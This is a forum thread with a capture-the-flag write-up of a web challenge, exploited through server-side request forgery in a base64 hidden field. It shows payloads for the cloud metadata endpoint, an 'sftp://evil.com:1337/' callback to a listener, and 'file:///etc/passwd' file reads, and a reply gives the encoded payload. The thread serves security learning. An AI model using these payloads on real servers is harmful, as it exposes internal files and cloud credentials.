<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Writeup: 0x00sec CTF - Exercise #5 - CTF - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Writeup CTF 0x00sec Web - Exercise #5

Another day, another ctf challenge. This time no. 5 of the web exercises 
As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling an&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="20658.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Writeup: 0x00sec CTF - Exercise #5&#39;" href="20658.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658" />
<meta name="twitter:url" content="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658" />
<meta property="og:title" content="Writeup: 0x00sec CTF - Exercise #5" />
<meta name="twitter:title" content="Writeup: 0x00sec CTF - Exercise #5" />
<meta property="og:description" content="Writeup CTF 0x00sec Web - Exercise #5  Another day, another ctf challenge. This time no. 5 of the web exercises  As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling and the dead ends I reached. Which were reached, because I tried to solve the challenge too early 😉  However, I think this process is also very interesting and I learned a lot!  The Challenge Like always the first thing we do, is to check out the source code of the login page...." />
<meta name="twitter:description" content="Writeup CTF 0x00sec Web - Exercise #5  Another day, another ctf challenge. This time no. 5 of the web exercises  As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling and the dead ends I reached. Which were reached, because I tried to solve the challenge too early 😉  However, I think this process is also very interesting and I learned a lot!  The Challenge Like always the first thing we do, is to check out the source code of the login page...." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="1 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="8 ❤" />
<meta property="article:published_time" content="2020-04-20T15:14:24+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="20658.html">Writeup: 0x00sec CTF - Exercise #5</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F1592A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">CTF</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Writeup: 0x00sec CTF - Exercise #5">
<meta itemprop="articleSection" content="CTF">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/H45uK1mchi"><span itemprop="name">H45uK1mchi</span></a>
</span>
<link itemprop="mainEntityOfPage" href="20658.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-20T15:14:24Z" class="post-time">
April 20, 2020, 3:14pm
</time>
<meta itemprop="dateModified" content="2020-04-28T12:57:40Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p><img src="../../images/transparent.png" alt="header-ctf-0x00sec" data-orig-src="upload://wOiVhJMMswDlMlkqZB8w6ZTLfjQ.png" width="690" height="269"></p>
<h1>Writeup CTF 0x00sec Web - Exercise <span class="hashtag">#5</span>
</h1>
<p>Another day, another ctf challenge. This time no. 5 of the web exercises</p>
<p>As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling and the dead ends I reached. Which were reached, because I tried to solve the challenge too early <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>However, I think this process is also very interesting and I learned a lot!</p>
<h2>The Challenge</h2>
<p>Like always the first thing we do, is to check out the source code of the login page. As we can find a lot of useful information in there.</p>
<p><img src="../../images/transparent.png" alt="01-page-source" data-orig-src="upload://7Yfs58aQQG85Ryt6nTCgr34Vd6Z.png" width="690" height="481"></p>
<p>Like in the previous exercises we see the hint in the HTML comment.</p>
<pre><code class="lang-auto">
&lt;!-- TODO: --&gt;

&lt;!-- * Stop relying on Base64! I'm sorry... --&gt;

</code></pre>
<p>Furthermore, we see some hidden inputs, which seem interesting.</p>
<pre><code class="lang-auto">
&lt;input type="hidden" name="ip" value="87.123.162.39"&gt;

&lt;input type="hidden" name="p" value="aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ=="&gt;

</code></pre>
<p>Now let’s decode the base64 string:</p>
<pre><code class="lang-auto">
➜ echo "aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ==" | base64 -D

https://ipinfo.io/87.123.162.39%

</code></pre>
<p>So let’s check and click on Login to see what happens.</p>
<p>If we do so, we should see the the output of <a href="http://ipinfo.io" rel="noopener nofollow ugc">ipinfo.io</a>.</p>
<p>We can double check with</p>
<pre><code class="lang-auto">
curl https://ipinfo.io/87.123.162.39

</code></pre>
<p>We can now tinker a bit with it. Let’s for example base64 encode <code>http://www.google.de</code> and pass it as the value.</p>
<p><img src="../../images/transparent.png" alt="02-google" data-orig-src="upload://gK1J7KehdXO9AtXDmaJPOtTuEnE.png" width="690" height="285"></p>
<p>And we see a very weird looking google page. So we can assume, what’s happening in the backend is that the server grabs the base64 encoded string, decodes it, runs maybe a curl on it and renders the results.</p>
<p>But as we control the command parameter, the site is vulnerable to a Server <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" rel="noopener nofollow ugc">Side Request Forgery Attack</a></p>
<h2>The Attack</h2>
<p>Well, we know the vulnerability now, but we do not really know how to abuse it.</p>
<p>Now comes the fun exploration part. We can try different inputs to see what is possible.</p>
<p>However, if you are not interested in the exploration and dead ends I’ve reached, you can skip to URL Scheme.</p>
<h3>Exploration</h3>
<p>To be honest I was also too much in Hack The Box mood, because I solved a box prior to the challenge and kind of gone bananas with it. I wanted to see what we can get out of it. Even tho, we know that this are <strong>Web</strong> exercises.</p>
<p>So I did a nmap scan, to see whats running there.</p>
<p><img src="../../images/transparent.png" alt="05-nmap" data-orig-src="upload://uuehzs7T2KWWt14vCLHMHVXwh4d.png" width="690" height="412"></p>
<p>And I also did a <code>whois 138.197.209.37</code> which returned that the IP belongs to Digital Ocean.</p>
<h3>Cloud Meta Data</h3>
<p>Well, we know that this is a Digital Ocean Droplet. So these cloud providers have some APIs for meta data. Which can hold interesting information like access keys.</p>
<p>I do not know the URL off my head so I checked <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-digital-ocean" rel="noopener nofollow ugc">PayloadsAllTheThings</a> and encoded <code>http://169.254.169.254/metadata/v1.json</code> as base64 and submitted it.</p>
<p>And we got the response with tons of information. But nothing very useful for now.</p>
<h3>URL Scheme</h3>
<p>Currently we are providing an URL with <code>http</code> so that the client knows, how to handle it. Now it would be interesting to see if we can access files on the server.</p>
<p>Can we communicate over other protocols?</p>
<p>Spoiler alert: Yes, we can!</p>
<p>I’ve just grabbed the examples from PayloadsAllTheThings and base64 encoded</p>
<pre><code class="lang-auto">
sftp://evil.com:1337/

</code></pre>
<p>But I replaced <a href="http://evil.com" rel="noopener nofollow ugc">evil.com</a> with my own server, where I started a netcat listener.</p>
<p><img src="../../images/transparent.png" alt="06-sftp" data-orig-src="upload://iLEkxAw5D4wakhLspfzR7X2nhvs.png" width="395" height="116"></p>
<p>Then I send the request with the encoded sftp url and got a response!</p>
<p><img src="../../images/transparent.png" alt="07-sftp2" data-orig-src="upload://93mkXdIuULETOA3280NbvHAfYX0.png" width="349" height="107"></p>
<p>Still cool, but this will get us nowhere. It can’t be that hard right?</p>
<p>But what about the <code>file</code> scheme?</p>
<p>So let’s try to encode <code>file:///etc/passwd</code> as base64 and submit it.<br>
We can again either use <a href="https://gchq.github.io/CyberChef/" rel="noopener nofollow ugc">CyberChef</a> or your terminal with</p>
<pre><code class="lang-auto">echo -n 'file:///etc/passwd' | base64
</code></pre>
<p>Change the input value and yep! We can read files. And if we take a closer look to the content of <code>/etc/passwd</code> we can see the flag.</p>
<h2>Conclusion</h2>
<p>Very cool vulnerability which can be abused in a lot of ways.</p>
<ul>
<li><a href="https://hackerone.com/reports/115748" rel="noopener nofollow ugc">https://hackerone.com/reports/115748</a></li>
</ul>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/DIVYA_Chawla"><span itemprop="name">DIVYA_Chawla</span></a>
(DIVYA Chawla)
</span>
<link itemprop="mainEntityOfPage" href="20658.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-28T08:49:43Z" class="post-time">
April 28, 2020, 8:49am
</time>
<meta itemprop="dateModified" content="2020-04-28T08:49:43Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Bro, capture the request in the Burp and and then use this payload to get the script, ZmlsZTovLy9ldGMvcGFzc3dk (file:///etc/passwd)</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/H45uK1mchi"><span itemprop="name">H45uK1mchi</span></a>
</span>
<link itemprop="mainEntityOfPage" href="20658.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-28T13:01:19Z" class="post-time">
April 28, 2020, 1:01pm
</time>
<meta itemprop="dateModified" content="2020-04-28T13:01:20Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yep, you can totally do this in Burp or any other proxy.</p>
<p>However, I try to avoid Burp in my write-ups. Simply because you do not need it to solve the CTFs. Furthermore these CTFs are designed for beginners. So it is always good to know the basics and how to handle this without tools like burp.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="20658.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-08-20T07:18:01Z" class="post-time">
August 20, 2020, 7:18am
</time>
<meta itemprop="dateModified" content="2020-08-20T07:18:01Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
